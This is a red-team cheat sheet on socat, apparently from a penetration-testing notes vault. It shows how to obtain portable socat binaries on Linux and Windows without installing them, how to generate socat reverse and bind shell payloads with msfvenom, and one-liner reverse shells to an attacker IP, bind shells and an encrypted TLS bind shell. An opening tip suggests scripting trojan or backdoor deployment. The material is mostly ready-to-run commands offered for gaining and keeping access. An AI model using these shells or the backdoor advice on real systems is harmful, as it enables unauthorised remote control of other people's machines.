---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - cross-platform
  - socat
---
# Socat

## 01 - Setup

> [!TIP]
> You can make an automated script to deploy a trojan horse or backdoor during the initial access and maintaining access. You can check for left over packages even if it's not installed in the system.

### 1.1 - Package Manager

#### 1.1.1 - Ubuntu/Debian Distros

Download the `.deb` file and extract it.

```
$ apt download socat

$ dpkg -x socat_*.deb work
```

Then you can just execute the program as it was portable.

```
$ work/usr/bin/socat -V
```

#### 1.1.2 - Red Hat Distros

Create a temporary folder and download the `.rpm` file.

```
$ mkdir implant && cd implant/

$ dnf download socat
```

Extract the `.rpm` package.

```
$ rpm2cpio socat-*.x86_64.rpm | cpio -idmv

$ tar xf socat-*.x86_64.rpm
```

Then you can just execute the program as it was portable.

```
$ usr/bin/socat -V
```

#### 1.1.3 - Arch Linux Distros

You can just download the `.tar.zst` file and extract it.

```
$ VERSION=$(pacman -Si socat | grep 'Version' | awk '{print $3}')

URL="https://archive.archlinux.org/packages/s/socat/socat-${VERSION}-x86_64.pkg.tar.zst"

wget $URL

tar --zstd -xf socat-*.pkg.tar.zst
```

Then you can just execute the program as it was portable.

```
$ usr/bin/socat -V
```

### 1.2 - Download Pre-compiled Binary

#### 1.2.1 - Linux

```
$ wget --no-hsts -qO socat https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.bin && chmod 755 socat

$ curl -o socat https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.bin && chmod 755 socat
```

#### 1.2.2 - Windows

Download the pre-compiled binary in command prompt.

```
C:\> certutil -urlcache -split -f https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.exe socat.exe

C:\> curl -o socat.exe https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.exe
```

Download the pre-compiled binary in PowerShell.

```
PS C:\> Invoke-WebRequest https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.exe -OutFile socat.exe
```

### 1.3 - Compile

#### 1.3.1 - Linux

```
$ git clone https://github.com/3ndG4me/socat.git && \
cd socat && ./configure && make && make install
```

#### 1.3.2 - Windows

TODO: Fill this info

## 03 - Generate via `msfvenom`

### 3.1 - Reverse Shells

#### 3.1.1 - TCP Method

```
$ msfvenom -p cmd/unix/reverse_socat_tcp lhost=<IP> lport=<PORT>
```

#### 3.1.2 - UDP Method

```
$ msfvenom -p cmd/unix/reverse_socat_udp lhost=<IP> lport=<PORT>
```

#### 3.1.3 - SCTP Method

```
$ msfvenom -p cmd/unix/reverse_socat_sctp lhost=<IP> lport=<PORT>
```

### 3.2 - Bind Shells

#### 3.2.1 - UDP Method

```
$ msfvenom -p cmd/unix/bind_socat_udp lport=<PORT>
```

#### 3.2.2 - SCTP Method

```
$ msfvenom -p cmd/unix/bind_socat_sctp lport=<PORT>
```

## 03 - One-liners

### 3.1 - Reverse Shells

#### 3.1.1 - TCP Method

```
$ socat TCP4:<attacker_IP>:<attacker_PORT> EXEC:/bin/bash

$ socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker_IP>:<attacker_PORT>
```

### 3.2 - Bind Shells

#### 3.2.1 - TCP Method

```
$ socat tcp-listen:<PORT>,reuseaddr,fork exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane
```

#### 3.2.2 - UDP Method

TODO: Generate an msfvenom for UDP bind shell socat

```
$ socat
```

#### 3.2.3 - TLS Method

Note: Only generated TLS certificates in a compromised system.

```
$ openssl req -newkey rsa:2048 -nodes -keyout private.key -x509 -days 362 -out certificate.crt

$ cat private.key certificate.crt > key.pem

$ socat OPENSSL-LISTEN:<PORT>,cert=key.pem,verify=0,fork EXEC:/bin/bash
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Desktop/Linux/Host/0xE - Discover Programs/Manual/Living off the Land|Enumeration and Discovery: Discover Programs]]

- [[DEB|File Transfer and Data Exfiltration: Linux Package Manager DEB]]

- [[RPM|File Transfer and Data Exfiltration: Linux Package Manager RPM]]

- [[AUR|File Transfer and Data Exfiltration: Linux Package Manager AUR]]

- [[PFL|File Transfer and Data Exfiltration: Linux Package Manager PFL]]

### Source Repositories

- [3ndG4me: Socat Source Repository](https://github.com/3ndG4me/socat)

- [runsisi: Socat Source Repository](https://github.com/runsisi/socat)

### GTFOBins

- [GTFOBins: Socat](https://gtfobins.github.io/gtfobins/socat/)

### Internal All The Things

- [InternalAllTheThings: Network Pivoting Techniques](https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/)

- [Certcube: Pivoting Port Forwarding](https://blog.certcube.com/pivoting-port-forwarding/)

- [Artkond Pivoting Guide](https://artkond.com/2017/03/23/pivoting-guide/)

- [SevenLayers: Socat Reverse Shell Relay](https://sevenlayers.com/index.php/blog/500-socat-reverse-shell-relay)

- [CyberSec Wikimandine: Socat](https://amandinegh.gitbook.io/cyberadventure/internal/pivoting-tunneling-and-port-forwarding/socat)